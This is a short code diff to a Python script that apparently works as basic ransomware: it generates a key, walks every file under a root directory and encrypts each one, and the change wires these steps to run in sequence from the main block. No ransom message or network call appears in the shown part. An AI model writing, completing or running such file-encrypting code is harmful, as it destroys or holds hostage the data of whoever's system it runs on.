@@ -22,12 +22,11 @@ def keygen():
 # Iterate directories
 files = []
 
-for dirpath, _, file in os.walk(rootdir):
-    for filename in file:
-        files.append(os.path.join(dirpath, filename))
+def iterate():
+    for dirpath, _, file in os.walk(rootdir):
+        for filename in file:
+            files.append(os.path.join(dirpath, filename))
 
-
-# Encrypt proc
 def encrypt():
     for file in files:
         with open(file, "rb") as thefile:
@@ -38,3 +37,5 @@ def encrypt():
 
 if __name__ == "__main__":
     keygen()
+    iterate()
+    encrypt()
